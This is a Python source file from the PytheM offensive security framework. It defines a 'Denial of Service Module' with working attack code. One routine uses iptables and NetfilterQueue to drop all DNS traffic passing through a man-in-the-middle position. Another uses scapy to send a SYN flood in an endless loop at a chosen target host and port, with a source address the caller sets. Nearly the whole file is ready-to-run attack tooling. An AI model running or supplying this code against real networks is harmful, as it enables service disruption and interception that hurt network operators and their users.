#!/usr/bin/python

# Copyright (c) 2016 Angelo Moura
#
# This file is part of the program PytheM
#
# PytheM is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA

from netfilterqueue import NetfilterQueue
from scapy.all import *
import os
import socket
import sys
import threading

class Jam(object):

	name = "Denial of Service Module."
	desc = "Denial of service attacks here."
	version = "0.4"
	ps = "Need to add more DoS attacks."

	def __init__(self):
		self.blocks = []
		self.stop = False
	def dnsdropstart(self,host):
		os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
                self.host = host
		try:
			print "[+] Man-in-the-middle DNS drop initialized."
			self.t = threading.Thread(name='mitmdrop', target=self.filter)
			self.t.setDaemon(True)
			self.t.start()
		except Exception as e:
			print "[!] Exception caught: {}".format(e)

	def dnsdropstop(self):
		os.system('iptables -t nat -D PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
		print "[-] Man-in-the-middle DNS drop finalized."

	def synfloodstart(self, host, tgt, dport):
		self.src = host
		self.tgt = tgt
		self.dport = dport
		try:
			print "[+] Syn flood denial of service initialized."
			self.s = threading.Thread(name='synflood', target=self.synflood)
			self.s.setDaemon(True)
			self.s.start()
		except Exception as e:
			print "[!] Exception caught: {}".format(e)

	def synfloodstop(self):
		self.stop = True
		print "[-] Syn flood denial of service finalized."

	def synflood(self):
		if self.stop == True:
			pass
		else:
			try:
				IP_layer = IP(src=self.src, dst=self.tgt)
				TCP_layer = TCP(sport=1337,dport=self.dport)
				pkt = IP_layer/TCP_layer
				send(pkt, loop=1, inter=0.0, verbose=False)
			except:
				print "[!] Error: check the parameters (target,interface,port)"

	def callback(self, packet):
                packet.drop()

	def filter(self):
		try:
			self.q = NetfilterQueue()
			self.q.bind(1, self.callback)
			self.q.run()
		except Exception as e:
			print "[!] Exception caught: {}".format(e)



